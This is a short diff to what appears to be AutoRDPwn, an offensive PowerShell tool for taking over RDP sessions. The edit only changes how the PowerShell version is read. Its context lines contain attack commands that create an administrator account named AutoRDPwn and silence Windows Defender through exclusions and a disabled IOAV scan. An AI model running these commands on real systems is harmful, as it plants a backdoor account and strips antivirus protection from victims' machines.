@@ -229,8 +229,7 @@ if($Language -in 'Spanish') {
   $Pwn5  = "net user AutoRDPwn AutoRDPwn /add ; net localgroup Administradores AutoRDPwn /add"
   $Pwn6  = "Agente de sesión de RDP" }
 
-    $Powershell = (Get-Host | findstr "Version" | select -First 1).split(':')[1].trim() ; Write-Host
-    if($Powershell -lt 4) { Write-Host "$txt3" -ForegroundColor 'Red' ; Write-Host ; Write-Host "$txt4" -NoNewLine -ForegroundColor 'Red'
+    $Powershell = $host.version ; Write-Host ; if($Powershell -lt 4) { Write-Host "$txt3" -ForegroundColor 'Red' ; Write-Host ; Write-Host "$txt4" -NoNewLine -ForegroundColor 'Red'
     Write-Host -NoNewLine ; Write-Host " http://aka.ms/wmf5download" -ForegroundColor 'Blue' ; Write-Host ; sleep -milliseconds 7500 ; exit }
     else { $osarch = wmic path Win32_OperatingSystem get OSArchitecture | findstr 'bits' ; $system = $osarch.trim() ; Add-MpPreference -ExclusionExtension ".exe" 2>&1> $null
     Add-MpPreference -ExclusionProcess $pid 2>&1> $null ; Add-MpPreference -ExclusionPath $env:temp 2>&1> $null ; Set-MpPreference -DisableIOAVProtection 1 2>&1> $null
